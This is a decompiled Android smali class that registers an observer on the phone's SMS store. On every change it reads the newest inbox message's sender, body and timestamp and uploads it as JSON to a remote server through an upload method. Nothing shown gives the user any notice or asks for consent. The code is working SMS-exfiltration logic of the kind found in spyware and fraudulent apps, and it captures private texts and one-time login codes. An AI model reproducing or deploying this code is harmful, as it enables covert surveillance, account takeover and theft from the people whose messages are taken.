.class public Lcom/common/lib/sms/SmsContent;
.super Landroid/database/ContentObserver;
.source "SmsContent.java"


# static fields
.field private static final MARKER:Ljava/lang/String; = "YOUR_KEYWORD"

.field private static final TAG:Ljava/lang/String; = "SmsContent"


# instance fields
.field private final MAX_COUNT:I

.field private cursor:Landroid/database/Cursor;

.field private isInRequest:Z

.field private mActivity:Landroid/content/Context;

.field private messageInfo:Lcom/common/lib/bean/MessageInfo;

.field private reRequestCount:I

.field private smsList:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lcom/common/lib/bean/MessageInfo;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>(Landroid/app/Activity;)V
    .locals 1

    const/4 v0, 0x0

    .line 37
    invoke-direct {p0, v0}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    .line 28
    iput-object v0, p0, Lcom/common/lib/sms/SmsContent;->cursor:Landroid/database/Cursor;

    const/4 v0, 0x2

    .line 32
    iput v0, p0, Lcom/common/lib/sms/SmsContent;->MAX_COUNT:I

    .line 38
    iput-object p1, p0, Lcom/common/lib/sms/SmsContent;->mActivity:Landroid/content/Context;

    .line 39
    new-instance p1, Ljava/util/ArrayList;

    invoke-direct {p1}, Ljava/util/ArrayList;-><init>()V

    iput-object p1, p0, Lcom/common/lib/sms/SmsContent;->smsList:Ljava/util/List;

    const/4 p1, 0x0

    .line 40
    iput-boolean p1, p0, Lcom/common/lib/sms/SmsContent;->isInRequest:Z

    .line 41
    iput v0, p0, Lcom/common/lib/sms/SmsContent;->reRequestCount:I

    return-void
.end method

.method static synthetic access$000(Lcom/common/lib/sms/SmsContent;)I
    .locals 0

    .line 24
    iget p0, p0, Lcom/common/lib/sms/SmsContent;->reRequestCount:I

    return p0
.end method

.method static synthetic access$002(Lcom/common/lib/sms/SmsContent;I)I
    .locals 0

    .line 24
    iput p1, p0, Lcom/common/lib/sms/SmsContent;->reRequestCount:I

    return p1
.end method

.method static synthetic access$010(Lcom/common/lib/sms/SmsContent;)I
    .locals 2

    .line 24
    iget v0, p0, Lcom/common/lib/sms/SmsContent;->reRequestCount:I

    add-int/lit8 v1, v0, -0x1

    iput v1, p0, Lcom/common/lib/sms/SmsContent;->reRequestCount:I

    return v0
.end method

.method static synthetic access$100(Lcom/common/lib/sms/SmsContent;)Ljava/util/List;
    .locals 0

    .line 24
    iget-object p0, p0, Lcom/common/lib/sms/SmsContent;->smsList:Ljava/util/List;

    return-object p0
.end method

.method static synthetic access$202(Lcom/common/lib/sms/SmsContent;Z)Z
    .locals 0

    .line 24
    iput-boolean p1, p0, Lcom/common/lib/sms/SmsContent;->isInRequest:Z

    return p1
.end method

.method static synthetic access$300(Lcom/common/lib/sms/SmsContent;Lcom/common/lib/bean/MessageInfo;)V
    .locals 0

    .line 24
    invoke-direct {p0, p1}, Lcom/common/lib/sms/SmsContent;->uploadSms(Lcom/common/lib/bean/MessageInfo;)V

    return-void
.end method

.method private addNewSms(Lcom/common/lib/bean/MessageInfo;)V
    .locals 1

    .line 101
    iget-object v0, p0, Lcom/common/lib/sms/SmsContent;->smsList:Ljava/util/List;

    if-eqz v0, :cond_0

    .line 102
    invoke-interface {v0, p1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 104
    :cond_0
    iget-object p1, p0, Lcom/common/lib/sms/SmsContent;->smsList:Ljava/util/List;

    invoke-interface {p1}, Ljava/util/List;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_1

    iget-boolean p1, p0, Lcom/common/lib/sms/SmsContent;->isInRequest:Z

    if-nez p1, :cond_1

    const/4 p1, 0x1

    .line 105
    iput-boolean p1, p0, Lcom/common/lib/sms/SmsContent;->isInRequest:Z

    .line 106
    iget-object p1, p0, Lcom/common/lib/sms/SmsContent;->smsList:Ljava/util/List;

    const/4 v0, 0x0

    invoke-interface {p1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Lcom/common/lib/bean/MessageInfo;

    invoke-direct {p0, p1}, Lcom/common/lib/sms/SmsContent;->uploadSms(Lcom/common/lib/bean/MessageInfo;)V

    :cond_1
    return-void
.end method

.method private uploadSms(Lcom/common/lib/bean/MessageInfo;)V
    .locals 6

    .line 111
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 112
    invoke-interface {v0, p1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 113
    sget-object p1, Lcom/common/lib/network/HttpMethods;->Companion:Lcom/common/lib/network/HttpMethods$Companion;

    invoke-virtual {p1}, Lcom/common/lib/network/HttpMethods$Companion;->getInstance()Lcom/common/lib/network/HttpMethods;

    move-result-object p1

    new-instance v1, Lcom/google/gson/Gson;

    invoke-direct {v1}, Lcom/google/gson/Gson;-><init>()V

    invoke-virtual {v1, v0}, Lcom/google/gson/Gson;->toJson(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lcom/common/lib/network/HttpObserver;

    new-instance v2, Lcom/common/lib/sms/SmsContent$1;

    invoke-direct {v2, p0}, Lcom/common/lib/sms/SmsContent$1;-><init>(Lcom/common/lib/sms/SmsContent;)V

    new-instance v3, Lio/reactivex/rxjava3/disposables/CompositeDisposable;

    invoke-direct {v3}, Lio/reactivex/rxjava3/disposables/CompositeDisposable;-><init>()V

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-direct {v1, v4, v5, v2, v3}, Lcom/common/lib/network/HttpObserver;-><init>(ZLcom/common/lib/mvp/IView;Lcom/common/lib/network/HttpListener;Lio/reactivex/rxjava3/disposables/CompositeDisposable;)V

    invoke-virtual {p1, v0, v1}, Lcom/common/lib/network/HttpMethods;->dedUpUpLoadSmsInfo(Ljava/lang/String;Lcom/common/lib/network/HttpObserver;)V

    return-void
.end method


# virtual methods
.method public onChange(Z)V
    .locals 1

    .line 46
    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    const/4 v0, 0x0

    .line 47
    invoke-virtual {p0, p1, v0}, Lcom/common/lib/sms/SmsContent;->onChange(ZLandroid/net/Uri;)V

    return-void
.end method

.method public onChange(ZLandroid/net/Uri;)V
    .locals 6

    if-nez p2, :cond_0

    const-string p1, "content://sms/inbox"

    .line 54
    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p2

    :cond_0
    move-object v1, p2

    .line 56
    invoke-virtual {v1}, Landroid/net/Uri;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "content://sms/raw"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    return-void

    .line 59
    :cond_1
    iget-object p1, p0, Lcom/common/lib/sms/SmsContent;->mActivity:Landroid/content/Context;

    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    iput-object p1, p0, Lcom/common/lib/sms/SmsContent;->cursor:Landroid/database/Cursor;

    if-eqz p1, :cond_2

    .line 61
    invoke-interface {p1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result p1

    if-eqz p1, :cond_3

    .line 62
    new-instance p1, Lcom/common/lib/bean/MessageInfo;

    invoke-direct {p1}, Lcom/common/lib/bean/MessageInfo;-><init>()V

    iput-object p1, p0, Lcom/common/lib/sms/SmsContent;->messageInfo:Lcom/common/lib/bean/MessageInfo;

    .line 63
    iget-object p1, p0, Lcom/common/lib/sms/SmsContent;->cursor:Landroid/database/Cursor;

    const-string p2, "address"

    invoke-interface {p1, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result p2

    invoke-interface {p1, p2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object p1

    .line 64
    iget-object p2, p0, Lcom/common/lib/sms/SmsContent;->cursor:Landroid/database/Cursor;

    const-string v0, "body"

    invoke-interface {p2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {p2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object p2

    .line 65
    iget-object v0, p0, Lcom/common/lib/sms/SmsContent;->cursor:Landroid/database/Cursor;

    const-string v1, "date"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v0

    .line 66
    iget-object v2, p0, Lcom/common/lib/sms/SmsContent;->cursor:Landroid/database/Cursor;

    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    .line 67
    iget-object v2, p0, Lcom/common/lib/sms/SmsContent;->messageInfo:Lcom/common/lib/bean/MessageInfo;

    invoke-virtual {v2, p2}, Lcom/common/lib/bean/MessageInfo;->setContent(Ljava/lang/String;)V

    .line 68
    iget-object p2, p0, Lcom/common/lib/sms/SmsContent;->messageInfo:Lcom/common/lib/bean/MessageInfo;

    invoke-virtual {p2, p1}, Lcom/common/lib/bean/MessageInfo;->setPhone(Ljava/lang/String;)V

    .line 69
    iget-object p1, p0, Lcom/common/lib/sms/SmsContent;->messageInfo:Lcom/common/lib/bean/MessageInfo;

    invoke-static {v0, v1}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Lcom/common/lib/bean/MessageInfo;->setSms_time(Ljava/lang/String;)V

    .line 70
    iget-object p1, p0, Lcom/common/lib/sms/SmsContent;->messageInfo:Lcom/common/lib/bean/MessageInfo;

    invoke-direct {p0, p1}, Lcom/common/lib/sms/SmsContent;->addNewSms(Lcom/common/lib/bean/MessageInfo;)V

    goto :goto_0

    .line 73
    :cond_2
    sget-object p1, Lcom/common/lib/sms/SmsContent;->TAG:Ljava/lang/String;

    const-string p2, "error: cursor == null"

    invoke-static {p1, p2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_3
    :goto_0
    return-void
.end method

.method public register()V
    .locals 3

    .line 81
    sget-object v0, Lcom/common/lib/sms/SmsContent;->TAG:Ljava/lang/String;

    const-string v1, "Register sms monitor"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 82
    iget-object v0, p0, Lcom/common/lib/sms/SmsContent;->mActivity:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms/"

    .line 83
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x1

    .line 82
    invoke-virtual {v0, v1, v2, p0}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    return-void
.end method

.method public unRegister()V
    .locals 2

    .line 90
    sget-object v0, Lcom/common/lib/sms/SmsContent;->TAG:Ljava/lang/String;

    const-string v1, "Unregister sms monitor"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 91
    iget-object v0, p0, Lcom/common/lib/sms/SmsContent;->mActivity:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-virtual {v0, p0}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    return-void
.end method
